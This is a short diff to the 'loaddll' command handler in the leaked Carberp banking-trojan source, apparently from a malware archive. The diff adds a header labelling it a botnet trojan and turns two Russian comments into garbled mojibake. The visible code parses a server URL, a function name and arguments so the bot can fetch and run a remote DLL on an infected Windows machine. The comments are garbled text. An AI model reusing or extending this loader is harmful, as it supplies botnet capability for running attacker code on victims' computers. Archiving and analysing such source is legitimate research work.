@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include"ComandLoadDLL.h"
 
 
@@ -114,11 +125,11 @@ DWORD WINAPI RunLoaderThread( LPVOID lpData )
 	return 0;
 
 }
-//loaddll url funcname parametrs до 4х штук
+//loaddll url funcname parametrs пїЅпїЅ 4пїЅ пїЅпїЅпїЅпїЅ
 //loaddll plug.blug|FuncRun|234|U|2|Ppp|
 bool ExecuteAllCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 {
-	// Запуск потока скрытого браузера
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PVoidData V = CreateStruct(VoidData);
 	V->Server	= STR::GetLeftStr(Args, "|");
 	V->FuncNam	=GetTextBetween(Args,"|","|");
